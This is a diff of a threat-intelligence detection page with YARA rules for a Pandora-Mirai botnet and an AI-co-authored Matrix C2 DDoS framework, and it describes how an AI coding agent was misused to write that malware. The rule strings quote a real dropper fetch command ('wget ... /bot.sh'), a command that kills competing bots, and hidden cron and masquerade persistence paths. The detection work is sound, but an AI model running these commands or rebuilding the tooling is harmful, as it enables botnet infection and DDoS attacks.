@@ -19,13 +19,22 @@ hide: true
 
 ## Detection Coverage Summary
 
-| Rule Type | Count | MITRE Techniques Covered | Overall FP Risk |
-|---|---|---|---|
-| YARA | 10 | T1027, T1037.004, T1053.003, T1059.006, T1059.007, T1095, T1498, T1587.001 | LOW–MEDIUM |
-| Sigma | 12 | T1014, T1037.004, T1053.003, T1071.001, T1095, T1543.002, T1546.004, T1547.013, T1564.001, T1059.007, T1059.006, T1587.001 | LOW–MEDIUM |
-| Suricata | 7 | T1071.001, T1095, T1498.001, T1498.002, T1587.001, T1584.004 | LOW |
+| Rule Type | Detection | Hunting | MITRE Techniques Covered | Atomics → feed |
+|---|---|---|---|---|
+| YARA | 6 | 4 | T1014, T1027, T1037.004, T1053.003, T1059.004, T1059.006, T1059.007, T1071.001, T1095, T1497.001, T1498.001, T1498.002, T1543.002, T1546.004, T1584.004, T1587.001 | 0 |
+| Sigma | 4 | 6 | T1014, T1027, T1037.004, T1053.003, T1059.004, T1059.007, T1095, T1190, T1498.001, T1543.002, T1546.004, T1564.001, T1587.001 | 2 |
+| Suricata | 2 | 8 | T1027, T1059.007, T1071.001, T1095, T1190, T1498.001, T1584.004, T1587.001, T1588.001 | 3 |
 
-**Priority distribution:** 5 HIGH / 9 MEDIUM / 5 LOW
+> **Detection vs Hunting:** *Detection rules* are high-fidelity and evasion-resilient — safe to alert on. *Hunting rules* are broader, for scoping and threat-hunting — expect to review the hits.
+
+**Retiering note (this revision):** this file was re-tiered against the `detection-rule-tiering` 4-gate rubric (durability → precision → level; novelty not applied at site scope). Original rule bodies are preserved wherever the gates supported Detection or Hunting as originally written. Five rules whose entire detection logic reduced to a single hardcoded IP with no surviving behavioral content — two Sigma network-connection rules and three Suricata rules — are removed as standalone rules; the underlying IPs were already present in the campaign IOC feed, so no feed edits were required. Several brittle-but-real rules (three YARA, one Sigma, seven Suricata) were salvaged via capability-abstraction rewrites — most commonly, dropping a mandatory hardcoded-IP condition term or broadening a Suricata destination from a single operator IP to `$EXTERNAL_NET` — so the underlying behavioral/structural signal survives infrastructure rotation. Each salvage is called out in the affected rule's Rationale.
+
+**Highest-confidence anchors:**
+- The operator-bespoke 22-char charset (`1gba4cdom53nhp12ei0kfj`, XOR-0x54 encoded) present in all 11 Naku/Pandora-Mirai architectures, combined with the Sora-fork `/bin/busybox SORA` marker and canonical Mirai debug symbols — cross-arch YARA coverage with near-zero FP.
+- The Matrix C2 Python framework's AI-authored banner/docstring/emoji-branding combination and the Discord-bot 13-method attack dispatch table — both structurally unique to this operator's build and resistant to single-string rename.
+- The `/etc/cron.d/.` hidden-prefix cron persistence Sigma rule — a pure technique-level signal (T1564.001) carrying zero operator-specific literals, so it survives complete infrastructure and binary-naming rotation.
+
+**Atomics routed to the IOC feed:** the Matrix C2 JSON-over-TCP/1337 channel (`87.106.143.220:1337`), the parasitic Naku CNC (`165.227.175.161:23`), and the two IONOS VPS IPs used as bare TLS-pivot destinations (`87.106.143.220`, `87.106.54.213`) were each the sole discriminator of a standalone Sigma or Suricata rule with no surviving behavioral content once the IP was mentally removed. All four IPs were already present with rich context in [`rovodev-mirai-matrix-c2-87.106.143.220-iocs.json`](/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json) prior to this revision — no feed edits were required.
 
 **Calibration note — prior art:**
 - Pandora-Mirai variant family traces to Doctor Web September 2023 (Tier 2 / B2); original scope was Android-TV only. The 11-architecture IoT extension documented here is first public characterization.
@@ -35,20 +44,33 @@ hide: true
 
 ---
 
-## YARA Rules
+## Multi-Family Organization
 
-### Pandora-Mirai (Naku ELF Bot Suite)
+This campaign spans three operator-artifact groups, each labeled inline within the Detection/Hunting subsections below:
+
+- **Pandora-Mirai (Naku ELF Bot Suite)** — the 11-architecture IoT botnet binaries and their bash dropper.
+- **Matrix C2 Framework** — the AI-co-authored Python DDoS-as-a-Service framework and its Discord-bot customer interface.
+- **Rovodev Operator Artifacts** — the operator's AI-agent session artifacts and natural-language prompts exposed via open directory.
 
 ---
 
-### Rule 1 — MAL_ELF_Naku_Pandora_Mirai_Family
+## YARA Rules
 
-**Detection Priority:** HIGH
-**Rationale:** Operator-bespoke 22-char charset `1gba4cdom53nhp12ei0kfj` is present in all 11 architectures (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86); single rule achieves cross-arch coverage. Combined with Sora-fork `/bin/busybox SORA` XOR-0x54-decoded marker and Mirai canonical symbols from the arm7 debug build, this rule achieves specific family identification at LOW FP risk.
+### Detection Rules
+
+**Pandora-Mirai (Naku ELF Bot Suite)**
+
+#### MAL_ELF_Naku_Pandora_Mirai_Family
+
+**Tier:** Detection
+**Robustness:** 3
 **ATT&CK Coverage:** T1027 (Obfuscated Files or Information), T1095 (Non-Application Layer Protocol), T1498.001 (Direct Network Flood)
-**Confidence:** HIGH — all strings confirmed DEFINITE cross-arch via byte-level analysis; charset present in all 11 release builds
-**False Positive Risk:** LOW — 22-char charset is operator-bespoke and not found in any other host in Hunt.io 365-day index; `/bin/busybox SORA` is Sora-fork-specific and not present in stock Mirai or generic IoT tools; `PandoraNet` botnet ID is unique to this operator
-**Deployment:** Endpoint ELF scanner, network sandbox detonation, IoT device firmware scanner, memory scanner on compromised Linux hosts
+**Confidence:** HIGH
+**Rationale:** The operator-bespoke 22-char charset `1gba4cdom53nhp12ei0kfj` is present in all 11 architectures; combined with the Sora-fork `/bin/busybox SORA` marker, the `PandoraNet` botnet ID, and canonical Mirai debug symbols (`add_auth_entry`, `resolve_cnc_addr`), no single renameable literal carries the rule — an operator would need to regenerate the charset, rename the Sora-fork marker, and strip debug symbols simultaneously to evade. Unchanged from the original file.
+**False Positives:** None known — the 22-char charset is operator-bespoke and not found on any other host in Hunt.io's 365-day index; `/bin/busybox SORA` is Sora-fork-specific and absent from stock Mirai or generic IoT tools; `PandoraNet` is unique to this operator.
+**Blind Spots:** A full rebrand that regenerates the charset AND renames the Sora-fork marker AND strips debug symbols would evade; targets on-disk/in-memory ELF, not a live network capture.
+**Validation:** Scan a Naku/Pandora-Mirai sample across any of the 11 architectures — at least one condition branch must match; a benign or stock-Mirai ELF binary must NOT fire.
+**Deployment:** Endpoint ELF scanner, network sandbox detonation, IoT device firmware scanner, memory scanner on compromised Linux hosts.
 
 ```yara
 /*
@@ -76,18 +98,16 @@ rule MAL_ELF_Naku_Pandora_Mirai_Family {
    strings:
       // Operator-bespoke 22-char random-string charset (XOR-0x54 encoded blob)
       // Decoded value: 1gba4cdom53nhp12ei0kfj
-      // Raw XOR-0x54 encoded form in binary
       $charset_xor = { 65 33 36 35 60 37 30 3B 39 61 67 3A 3C 24 65 66 31 3D 64 3F 32 3E }
       // Sora-fork derivative: /bin/busybox SORA XOR-0x54 encoded
-      // Distinguishes from stock Mirai /bin/busybox MIRAI
       $sora_xor = { 7B 36 3D 3A 36 21 27 36 3B 2C 74 24 27 20 61 }
       // PandoraNet operator botnet ID (plaintext in arm7 debug build and process args)
       $pandoranet = "PandoraNet" ascii fullword
-      // Mirai canonical function symbols (arm7 debug build; these are DEFINITE Mirai-lineage markers)
+      // Mirai canonical function symbols (arm7 debug build; DEFINITE Mirai-lineage markers)
       $sym_auth = "add_auth_entry" ascii fullword
       $sym_resolve = "resolve_cnc_addr" ascii fullword
       // .anime operator-bespoke marker (XOR-0x54 decoded)
-      $anime_xor = { 7F 61 59 97 } // partial XOR-0x54 encoding of ".anime"
+      $anime_xor = { 7F 61 59 97 }
    condition:
       uint32(0) == 0x464C457F and
       filesize < 200KB and
@@ -101,21 +121,22 @@ rule MAL_ELF_Naku_Pandora_Mirai_Family {
 }
 ```
 
----
+#### MAL_Bash_Pandora_Dropper_Family
 
-### Rule 2 — MAL_Bash_Pandora_Dropper_Family
-
-**Detection Priority:** HIGH
-**Rationale:** Pandora.sh / Naku.sh dropper class fetches binaries for all 11 architectures in a loop; the arch-iteration string pattern combined with operator-specific distribution URLs and execution-with-arch-tag is specific to this family. Two confirmed hashes (HTTPS-channel variant and standard variant) anchor the rule.
+**Tier:** Detection
+**Robustness:** 2
 **ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1059.004 (Unix Shell), T1587.001 (Develop Capabilities: Malware)
-**Confidence:** HIGH — dropper artifacts directly captured from operator infrastructure; arch-iteration-wget pattern is operator-specific
-**False Positive Risk:** LOW — specific arch-set (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86) combined with Pandora/Naku naming and operator IP makes false positive production-impractical
-**Deployment:** Linux filesystem scanner (bash scripts), web proxy log scanning for outbound fetches matching this pattern
+**Confidence:** HIGH
+**Rationale:** Salvaged from the original — every condition branch required a hardcoded operator IP (`87.106.143.220` or `80.211.94.16`), so the rule would stop detecting entirely the moment the operator rotated VPS (Gate 1 durability failure; both IPs are already carried in the campaign IOC feed). Rewritten to drop the IP dependency and anchor purely on the 11-arch dropper's structural signature: ≥3 of a 6-member IoT-architecture suffix set combined with `Naku.`/`Pandora.` binary naming, or the operator's specific execution-tag/cleanup command sequence. This survives full infrastructure rotation; an operator would need to rename every dropped binary and change the exec-tag convention to evade.
+**False Positives:** None known — the arch-suffix-set-plus-naming combination and the `pandora_bot PandoraNet` / `./nig realtek` exec-tag patterns have no legitimate collision.
+**Blind Spots:** A rebrand that renames the arch-tagged binaries AND drops the `Naku.`/`Pandora.` prefix AND changes the exec-tag convention would evade; targets the on-disk dropper script, not network delivery.
+**Validation:** Scan the dropper script (`hash1` below) — the arch-count/naming branch or an exec-tag branch must match; a benign multi-arch build/CI script must NOT fire.
+**Deployment:** Linux filesystem scanner (bash scripts), web proxy log scanning for outbound fetches matching this pattern.
 
 ```yara
 rule MAL_Bash_Pandora_Dropper_Family {
    meta:
-      description = "Detects pandora.sh / Naku.sh dropper class fetching 11-architecture Pandora-Mirai ELF binaries via wget/curl loop. Operator-specific arch-set (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86), execution-with-arch-tag pattern, and cleanup sequence identify this dropper family across both standard (port 80) and HTTPS-channel (port 443) variants."
+      description = "Detects pandora.sh / Naku.sh dropper class fetching 11-architecture Pandora-Mirai ELF binaries via wget/curl loop. Operator-specific arch-set (arm5/arm6/m68k/mpsl/sh4/spc), Naku./Pandora. binary naming, execution-with-arch-tag pattern, and cleanup sequence identify this dropper family independent of current distribution-host IP."
       license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
       author = "The Hunters Ledger"
       reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
@@ -133,13 +154,10 @@ rule MAL_Bash_Pandora_Dropper_Family {
       $arch_mpsl   = "mpsl" ascii
       $arch_sh4    = "sh4"  ascii
       $arch_spc    = "spc"  ascii
-      // Operator distribution host patterns
-      $distrib_primary = "87.106.143.220" ascii
-      $distrib_aruba   = "80.211.94.16" ascii
       // Binary naming conventions
       $bin_naku    = "Naku." ascii
       $bin_pandora = "Pandora." ascii
-      // Execution-with-arch-tag pattern (argv-source-tagging)
+      // Execution-with-arch-tag pattern (argv-source-tagging) — IP-independent
       $exec_tag_r  = "./nig realtek" ascii
       $exec_tag_n  = "pandora_bot PandoraNet" ascii
       // Cleanup pattern
@@ -147,27 +165,26 @@ rule MAL_Bash_Pandora_Dropper_Family {
    condition:
       filesize < 50KB and
       (
-         (3 of ($arch_*) and ($bin_naku or $bin_pandora) and ($distrib_primary or $distrib_aruba)) or
-         ($exec_tag_r and $cleanup and $distrib_aruba) or
-         ($exec_tag_n and ($distrib_primary or $distrib_aruba))
+         (3 of ($arch_*) and ($bin_naku or $bin_pandora)) or
+         ($exec_tag_r and $cleanup) or
+         $exec_tag_n
       )
 }
 ```
 
----
+**Matrix C2 Framework**
 
-### Matrix C2 Python Framework (AI-Co-Authored via Rovodev)
+#### MAL_Python_Matrix_C2_Framework_Family
 
----
-
-### Rule 3 — MAL_Python_Matrix_C2_Framework_Family
-
-**Detection Priority:** HIGH
-**Rationale:** Direct AI-authored strings captured from Rovodev session_context.json file_write payloads. The combination of the MATRIX C2 ASCII-banner header, `mass_infection` docstring matching exactly with the session JSON, and the AI-Generated Code Signature emoji-branding pattern (🔥 ICMP Hell, 🚀 UDP Bypass) is uniquely specific to this framework. The `Increased default threads for 50Gbps+` operator-marketing comment is operator-authored and low-probability to appear in any legitimate code.
+**Tier:** Detection
+**Robustness:** 3
 **ATT&CK Coverage:** T1059.006 (Python), T1498.001 (Direct Network Flood), T1498.002 (Reflection Amplification), T1587.001 (Develop Capabilities: Malware)
-**Confidence:** HIGH — strings captured directly from Rovodev session JSON file_write tool call payloads; zero ambiguity on authorship
-**False Positive Risk:** LOW — `MATRIX C2 - IMPLEMENTATION PLAN` banner + emoji-branded attack-method names combined with `50Gbps+` marketing comment is specific to this operator's framework; no known legitimate tool uses this combination
-**Deployment:** Linux filesystem scanner (Python scripts), network sandbox detonation, SIEM content search on analyst workstations
+**Confidence:** HIGH
+**Rationale:** Direct AI-authored strings captured from Rovodev session_context.json file_write payloads. The MATRIX C2 ASCII-banner header, `mass_infection` docstring, emoji-branded attack-method names, and the operator-marketing `50Gbps+` comment form multiple independent phrase anchors — no single renameable literal carries the rule. Unchanged from the original file.
+**False Positives:** None known — the banner + emoji-branded attack-method names + `50Gbps+` marketing comment combination is specific to this operator's framework; no known legitimate tool uses this combination.
+**Blind Spots:** A full source rewrite that strips all banner/docstring/emoji strings would evade; targets on-disk/in-memory Python source, not compiled/obfuscated builds.
+**Validation:** Scan `master_control.py` / `attack_engine.py` / `multi_vector_agent.py` (hashes below) — at least one condition branch must match; unrelated legitimate DDoS-testing or load-testing tools must NOT fire.
+**Deployment:** Linux filesystem scanner (Python scripts), network sandbox detonation, SIEM content search on analyst workstations.
 
 ```yara
 rule MAL_Python_Matrix_C2_Framework_Family {
@@ -185,21 +202,14 @@ rule MAL_Python_Matrix_C2_Framework_Family {
       campaign = "UTA-2026-014"
       id = "d804ea26-cbfc-5194-854c-228ee9cfc434"
    strings:
-      // AI-generated ASCII-banner header (IMPLEMENTATION_PLAN.txt)
       $banner     = "MATRIX C2 - IMPLEMENTATION PLAN" ascii
-      // AI-generated docstring captured in session_context.json file_write payload
       $docstring  = "Launch mass infection campaign" ascii
-      // AI-Generated Code Signature #9 — emoji-in-output bleed in attack catalog
       $emoji_icmp = "\xf0\x9f\x94\xa5 ICMP Hell" ascii
       $emoji_udp  = "\xf0\x9f\x9a\x80 UDP Bypass" ascii
-      // Operator-marketing comment inline in attack_engine.py source
       $gbps_claim = "Increased default threads for 50Gbps+" ascii
-      // AI-Generated Documentation Signature — compounding-superlative naming
       $final_doc  = "FINAL_DEPLOYMENT_COMPLETE" ascii
       $ultimate   = "ULTIMATE_DEPLOYMENT" ascii
-      // LLM closure phrase captured in IMPLEMENTATION_PLAN.txt
       $llm_close  = "Let me start Phase 1 now" ascii
-      // Method dispatch table entries (attack_engine.py)
       $method_udp = "'udp-star'" ascii
       $method_syn = "'syn-storm'" ascii
       $method_ovh = "'ovh-nuke'" ascii
@@ -214,85 +224,22 @@ rule MAL_Python_Matrix_C2_Framework_Family {
 }
 ```
 
----
+#### MAL_Discord_Bot_DDoSasService_Customer_Interface
 
-### Rule 4 — MAL_Python_AIGenerated_OffensiveCode_Universal_Subset
-
-**Detection Priority:** MEDIUM
-**Rationale:** Cross-3-operator DEFINITE universal subset of the AI-Generated Code Structural Signature. Covers criteria #1 (verbose docstrings), #3 (educational variable names), #7 (bare-except + verbose-docstring co-occurrence), #9 (emoji-in-output bleed in offensive context), and #10 (version-numbered file persistence chain). No single criterion is sufficient alone; the multi-criteria gate reduces FP risk. Scope: cross-case rule applicable to operator-built AI-authored offensive Python tooling beyond this specific campaign.
-**ATT&CK Coverage:** T1059.006 (Python), T1587.001 (Develop Capabilities: Malware)
-**Confidence:** HIGH for the universal-subset criteria; MODERATE for any individual file match without corroborating context
-**False Positive Risk:** MEDIUM — verbose docstrings and bare-except are common in legitimate Python code; rule requires multi-criteria co-occurrence to reduce FPs. Deploy with context review; flag for analyst triage rather than automated block. The emoji-in-offensive-context string narrows the FP surface significantly when present.
-**Deployment:** Code repository scanner, Python script analyst triage, threat hunting in developer-accessible environments. Do NOT deploy as automated block — flag for analyst triage.
-
-```yara
-rule MAL_Python_AIGenerated_OffensiveCode_Universal_Subset {
-   meta:
-      description = "Cross-operator detection for AI-generated offensive Python code using the 5-criteria universal subset confirmed across 3 independent operators (Russian Gemini, Turkish ARPA, English Rovodev). Detects co-occurrence of verbose docstrings, bare-except handlers, educational variable naming, emoji-in-output bleed, and version-numbered iteration chains that are structurally diagnostic of AI-authored offensive tooling. High FP risk in isolation; requires multi-criteria co-occurrence gate."
-      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
-      author = "The Hunters Ledger"
-      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
-      date = "2026-05-26"
-      hash1 = "64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260"
-      family = "AI-Generated Offensive Code"
-      malware_type = "Offensive Python (AI-authored)"
-      campaign = "ai-agent-frameworks-2026-05-23"
-      id = "38aeca8a-3dad-5b61-9787-a14edf92a250"
-   strings:
-      // Criterion #7 — bare-except + verbose-docstring co-occurrence
-      // (bare except in Python: "except:" or "except Exception:" + "pass")
-      $bare_except1 = "except:" ascii
-      $bare_except2 = "except Exception:" ascii
-      $bare_pass    = /except[^\n]*:\s*\n\s*pass/ ascii
-      // Criterion #1 / #3 — verbose docstrings with educational/operational naming
-      $doc_attack   = /def \w+_attack\w*\(.*\):\s*\n\s+\"\"\"/ ascii
-      $doc_flood    = /def \w+_flood\w*\(.*\):\s*\n\s+\"\"\"/ ascii
-      $doc_scan     = /def \w+_scan\w*\(.*\):\s*\n\s+\"\"\"/ ascii
-      $doc_infect   = /def \w+_infect\w*\(.*\):\s*\n\s+\"\"\"/ ascii
-      // Criterion #9 — emoji-in-output bleed in offensive context
-      $emoji_fire   = "\xf0\x9f\x94\xa5" ascii   // 🔥
-      $emoji_rocket = "\xf0\x9f\x9a\x80" ascii   // 🚀
-      $emoji_check  = "\xe2\x9c\x85"     ascii   // ✅
-      // Criterion #10 — version-numbered file persistence chain
-      $ver_chain_v2 = "_v2." ascii
-      $ver_chain_v3 = "_v3." ascii
-      $ver_chain_v4 = "_v4." ascii
-      // Offensive context markers (required to anchor rule to malicious code, not legitimate tooling)
-      $ctx_ddos  = "ddos" nocase ascii
-      $ctx_flood = "flood" nocase ascii
-      $ctx_brute = "brute" nocase ascii
-      $ctx_infect = "infect" nocase ascii
-      $ctx_cnc   = "cnc" nocase ascii
-   condition:
-      filesize < 500KB and
-      // Must be Python
-      (uint16(0) == 0x2123 or $bare_except1 or $bare_except2) and
-      // Must have offensive context
-      (1 of ($ctx_*)) and
-      // Must have multiple AI-signature criteria
-      (
-         ($bare_pass and 1 of ($doc_*)) or
-         (1 of ($emoji_*) and 1 of ($doc_*)) or
-         (2 of ($ver_chain_v2, $ver_chain_v3, $ver_chain_v4) and 1 of ($doc_*))
-      )
-}
-```
-
----
-
-### Rule 5 — MAL_Discord_Bot_DDoSasService_Customer_Interface
-
-**Detection Priority:** HIGH
-**Rationale:** The JavaScript attack-method dispatch table with all 13 attack-method names, GBPS estimates, and VIP/free tier boolean fields is specific to this DDoS-as-a-Service platform. The emoji-branded method names (🔥 ICMP Hell, 🚀 UDP Bypass) are unlikely to appear in legitimate Discord bots. The combination of DDoS method names + tier model + specific GBPS claim is unique.
+**Tier:** Detection
+**Robustness:** 3
 **ATT&CK Coverage:** T1059.007 (JavaScript), T1498.001 (Direct Network Flood), T1498.002 (Reflection Amplification)
-**Confidence:** HIGH — dispatch table captured directly from Rovodev session JSON; method names confirmed in Discord bot source
-**False Positive Risk:** LOW — specific combination of 13+ DDoS attack-method names with VIP tier model and GBPS estimates is not found in legitimate Discord bots; emoji branding narrows further
-**Deployment:** JavaScript/Node.js file scanner, Discord bot code review, web application code analysis
+**Confidence:** HIGH
+**Rationale:** The JavaScript attack-method dispatch table requires renaming or removing most of an 8-entry bespoke method catalog (`udp-star`, `syn-storm`, `tcp-matrix`, `tcp-rst`, `udp-bypass`, `icmp-hell`, `multi-vector`, `http-flood`, `mass_infection`, `frag-storm`, `dns-rain`, `ovh-nuke`, `http-star`) plus the tier/GBPS/emoji branding to evade — a substantial rewrite. Unchanged from the original file.
+**False Positives:** None known — the specific combination of 13+ DDoS attack-method names with VIP tier model and GBPS estimates is not found in legitimate Discord bots; emoji branding narrows further.
+**Blind Spots:** A full dispatch-table rewrite under new method names would evade; targets the on-disk/in-memory JS source.
+**Validation:** Scan the Discord bot JS source (`hash1` below) — at least one condition branch must match; unrelated legitimate Discord moderation/utility bots must NOT fire.
+**Deployment:** JavaScript/Node.js file scanner, Discord bot code review, web application code analysis.
 
 ```yara
 rule MAL_Discord_Bot_DDoSasService_Customer_Interface {
    meta:
-      description = "Detects Matrix C2 Discord-bot customer interface JavaScript dispatch table for DDoS-as-a-Service. Identifies the 13-attack-method catalog (udp-star, syn-storm, tcp-matrix, tcp-rst, udp-bypass, icmp-hell, multi-vector, http-flood, mass_infection, frag-storm, dns-rain, ovh-nuke, http-star) combined with VIP/free tier branding, GBPS capability estimates, and AI-Generated Code Signature emoji branding (🔥 🚀). Captured directly from Atlassian Rovodev session JSON rovodev.log."
+      description = "Detects Matrix C2 Discord-bot customer interface JavaScript dispatch table for DDoS-as-a-Service. Identifies the 13-attack-method catalog (udp-star, syn-storm, tcp-matrix, tcp-rst, udp-bypass, icmp-hell, multi-vector, http-flood, mass_infection, frag-storm, dns-rain, ovh-nuke, http-star) combined with VIP/free tier branding, GBPS capability estimates, and AI-Generated Code Signature emoji branding."
       license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
       author = "The Hunters Ledger"
       reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
@@ -303,7 +250,6 @@ rule MAL_Discord_Bot_DDoSasService_Customer_Interface {
       campaign = "UTA-2026-014"
       id = "0f9967aa-bd3f-5fba-be62-bf75b119989b"
    strings:
-      // Attack method names from dispatch table
       $m_udpstar  = "'udp-star'" ascii
       $m_synstorm = "'syn-storm'" ascii
       $m_tcpmat   = "'tcp-matrix'" ascii
@@ -317,12 +263,9 @@ rule MAL_Discord_Bot_DDoSasService_Customer_Interface {
       $m_dns      = "'dns-rain'" ascii
       $m_ovh      = "'ovh-nuke'" ascii
       $m_httpstar = "'http-star'" ascii
-      // Tier model marker
       $tier_vip   = "vip: true" ascii
       $tier_free  = "vip: false" ascii
-      // GBPS estimate field (operator-marketing data in dispatch table)
       $gbps_field = "gbps:" ascii
-      // Emoji branding from attack catalog
       $emoji_icmp = "\xf0\x9f\x94\xa5 ICMP Hell" ascii
       $emoji_udp  = "\xf0\x9f\x9a\x80 UDP Bypass" ascii
    condition:
@@ -335,20 +278,213 @@ rule MAL_Discord_Bot_DDoSasService_Customer_Interface {
 }
 ```
 
----
+**Rovodev Operator Artifacts**
 
-### Operator Artifacts (Rovodev Session Artifacts)
+#### MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring
 
----
+**Tier:** Detection
+**Robustness:** 2
+**ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware)
+**Confidence:** HIGH
+**Rationale:** Salvaged from the original — one condition branch matched on either of two literal Rovodev session UUIDs alone (`257b6faf-...` / `8b911ec6-...`), a single-sample identifier with zero generalizability (equivalent to a hash match, not a signature). Removed that branch and tightened the remaining "session artifact" branch to require a malicious-content marker (`mass_infection` docstring or `MATRIX C2` header) rather than firing on any Rovodev session that merely writes a Python file — the untightened version would have matched any benign Rovodev coding session.
+**False Positives:** Low — `session_context`/`file_write`/`initial_content`/`rovodev.log` are all legitimate Atlassian Rovodev artifact names, but every surviving condition branch requires a co-occurring malicious content marker (`Launch mass infection campaign` docstring or `MATRIX C2` banner), which have no legitimate collision.
+**Blind Spots:** A future AI-authoring session that produces equivalent malicious capability without ever writing the exact `mass_infection`/`MATRIX C2` phrases would evade; requires the operator's OPSEC failure of exposing the session artifact.
+**Validation:** Scan an exposed Rovodev session_context.json/rovodev.log containing the Matrix C2 authoring session — must match; a benign Rovodev session writing unrelated Python code must NOT fire.
+**Deployment:** Web crawler for open-directory detection, filesystem scanner on suspected operator hosts.
 
-### Rule 6 — MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt
+```yara
+rule MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring {
+   meta:
+      description = "Detects operator-exposed Atlassian Rovodev AI coding agent session artifacts (session_context.json / rovodev.log) containing file_write tool calls with offensive Python initial_content payloads, gated on a co-occurring Matrix C2 content marker to exclude benign Rovodev sessions."
+      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
+      author = "The Hunters Ledger"
+      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
+      date = "2026-05-26"
+      hash1 = "9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa"
+      family = "Rovodev Operator Artifacts"
+      malware_type = "AI Coding Agent Session Artifact"
+      campaign = "UTA-2026-014"
+      id = "826c0fe7-b1fc-5689-9fd7-69e2abc40277"
+   strings:
+      $session_key = "session_context" ascii
+      $tool_call   = "file_write" ascii
+      $init_content = "initial_content" ascii
+      $rovo_log    = "rovodev.log" ascii
+      $py_shebang  = "#!/usr/bin/env python3" ascii
+      $mass_infect = "Launch mass infection campaign" ascii
+      $c2_header   = "MATRIX C2" ascii
+   condition:
+      filesize < 2MB and
+      (
+         ($session_key and $tool_call and $init_content and $py_shebang and ($mass_infect or $c2_header)) or
+         ($tool_call and $mass_infect) or
+         ($rovo_log and $c2_header)
+      )
+}
+```
 
-**Detection Priority:** MEDIUM
-**Rationale:** The `whatineed.txt` file is the operator's natural-language operational specification to Rovodev AI. The combination of C2-debugging request, GitHub C2-leak reference format, "automatic give me login" credential harvesting request, and Discord user-ID disclosure constitutes a specific adversarial-intent file pattern. This rule catches operator-prompt-class files that signal AI-co-authored offensive operations.
+#### MAL_Python_Persistent_Bot_DualChannel_CNC
+
+**Tier:** Detection
+**Robustness:** 2
+**ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1059.004 (Unix Shell), T1071.001 (Web Protocols), T1543.002 (Systemd Service), T1546.004 (Unix Shell Configuration Modification)
+**Confidence:** HIGH
+**Rationale:** Multi-branch rule where 3 of 5 branches (hidden cron entry + masquerade init.d/systemd names; heartbeat message + port + hidden cron; JSON field-name structure) carry no dependency on the operator's C2 IP, so the rule survives infrastructure rotation even though two branches additionally reference the hardcoded IP as a strengthening (not sole) anchor. Unchanged from the original file.
+**False Positives:** None known — the hidden `.cache_update` cron filename, the `sysupdate`/`system-update.service` masquerade pair, and the `bot_register`/`arch`/`vendor` JSON wire-format fields have no plausible legitimate collision in combination.
+**Blind Spots:** A rebuild that renames the masquerade persistence files AND changes the JSON wire-format field names would evade; targets the on-disk installer script.
+**Validation:** Scan `persistent_bot.sh` (hash below) — at least one condition branch must match; a benign system-update or configuration-management script must NOT fire.
+**Deployment:** Linux filesystem scanner (bash scripts), EDR persistence monitoring for cron/init.d/systemd creation events.
+
+```yara
+rule MAL_Python_Persistent_Bot_DualChannel_CNC {
+   meta:
+      description = "Detects persistent_bot.sh-class operator scripts implementing 5-vector Linux persistence and dual-channel CNC architecture. Identifies operator-specific JSON wire format (bot_register + heartbeat messages with bot_type/arch/vendor fields), hidden cron entry /etc/cron.d/.cache_update, and masquerade persistence (sysupdate init.d service + system-update.service systemd unit)."
+      license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"
+      author = "The Hunters Ledger"
+      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
+      date = "2026-05-26"
+      hash1 = "4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b"
+      family = "Matrix C2"
+      malware_type = "Persistence Installer (AI-authored)"
+      campaign = "UTA-2026-014"
+      id = "91f7bf1a-6620-50cf-81c0-ff7faf1328e3"
+   strings:
+      $wire_reg   = "\"type\":\"bot_register\"" ascii
+      $wire_arch  = "\"arch\":\"$arch\"" ascii
+      $wire_vendor = "\"vendor\":\"$vendor\"" ascii
+      $wire_hb    = "\"type\":\"heartbeat\"" ascii
+      $cnc_ep     = "87.106.143.220" ascii
+      $cnc_port   = "1337" ascii
+      $cron_hidden = "/etc/cron.d/.cache_update" ascii
+      $initd_mask  = "/etc/init.d/sysupdate" ascii
+      $systemd_mask = "/etc/systemd/system/system-update.service" ascii
+      $reseed     = "wget -qO- http://87.106.143.220/bot.sh" ascii
+      $kill_comp  = "pkill -9 -f \"(mirai|qbot|tsunami|gafgyt|bashlite|kaiten)\"" ascii
+   condition:
+      filesize < 50KB and
+      (
+         ($wire_reg and $cnc_ep) or
+         ($cron_hidden and ($initd_mask or $systemd_mask)) or
+         ($reseed and $kill_comp) or
+         ($wire_hb and $cnc_port and $cron_hidden) or
+         ($wire_arch and $wire_vendor and ($wire_reg or $wire_hb))
+      )
+}
+```
+
+### Hunting Rules
+
+**Matrix C2 Framework**
+
+#### MAL_Python_AIGenerated_OffensiveCode_Universal_Subset
+
+**Tier:** Hunting
+**Robustness:** 2
+**ATT&CK Coverage:** T1059.006 (Python), T1587.001 (Develop Capabilities: Malware)
+**Confidence:** MODERATE (HIGH for the universal-subset criteria as a class; MODERATE for any individual file match without corroborating context)
